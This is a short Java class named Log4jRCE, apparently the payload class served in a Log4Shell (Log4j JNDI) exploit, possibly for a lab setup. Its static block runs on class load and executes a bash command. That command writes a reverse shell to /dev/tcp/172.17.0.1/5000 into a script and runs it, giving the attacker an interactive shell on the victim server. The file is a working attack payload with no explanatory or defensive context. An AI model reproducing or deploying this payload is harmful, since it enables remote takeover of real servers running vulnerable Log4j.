public class Log4jRCE {
    static {
                try {
                    Runtime r = Runtime.getRuntime();

                    // TODO
                    String[] cmd = {"bash", "-c", "echo 'nohup bash -i >/dev/tcp/172.17.0.1/5000 2>&1 0<&1 &' > /server/script.sh; bash /server/script.sh"}; 

                    Process p = r.exec(cmd);
                    p.waitFor();
                } catch (Exception e) {
                    e.printStackTrace();
                }
    }
}